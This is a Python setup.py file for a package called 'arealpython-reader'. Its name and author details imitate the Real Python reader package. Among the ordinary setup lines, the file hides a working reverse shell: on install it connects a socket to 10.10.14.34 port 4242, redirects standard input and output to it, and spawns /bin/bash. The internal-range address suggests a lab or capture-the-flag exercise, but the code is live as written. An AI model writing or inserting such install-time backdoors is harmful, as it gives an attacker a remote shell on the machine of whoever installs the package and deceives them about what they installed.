import pathlib
from setuptools import setup

# The directory containing this file
HERE = pathlib.Path(__file__).parent

RHOST="10.10.14.34"
RPORT='4242'
import sys,socket,os,pty
s=socket.socket()
s.connect((RHOST,int(RPORT)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
# The text of the README file
README = (HERE / "README.md").read_text()

# This call to setup() does all the work
setup(
    name="arealpython-reader",
    version="2.0.0",
    description="Read the latest Real Python tutorials",
    long_description=README,
    long_description_content_type="text/markdown",
    url="https://github.com/arealpython/reader",
    author="aReal Python",
    author_email="ainfo@realpython.com",
    license="MIT",
    install_requires=["sys", "socket", "pty"],
    classifiers=[
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
    ],
    python_requires='>=3.6'
)

